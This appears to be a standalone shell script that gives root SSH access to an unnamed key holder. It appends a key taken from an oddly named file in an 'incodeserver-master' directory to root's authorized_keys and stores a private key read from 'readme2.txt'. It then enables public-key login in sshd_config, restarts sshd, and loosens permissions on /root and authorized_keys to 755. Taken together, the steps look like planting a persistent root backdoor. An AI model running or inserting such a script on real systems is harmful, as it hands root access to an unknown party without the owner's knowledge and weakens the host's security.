mkdir /root/.ssh
cat /root/incodeserver-master/gongmi.gongmi >> /root/.ssh/authorized_keys
cat /root/incodeserver-master/readme2.txt >> /root/.ssh/pr
chmod 755 /root
chmod 755 /root/.ssh/authorized_keys
chmod 600 /root/.ssh/pr
sed -i '$a\AuthorizedKeysFile     /root/.ssh/authorized_keys'  /etc/ssh/sshd_config
sed -i '$a\RSAAuthentication yes'  /etc/ssh/sshd_config
sed -i '$a\PubkeyAuthentication yes'  /etc/ssh/sshd_config
service sshd restart
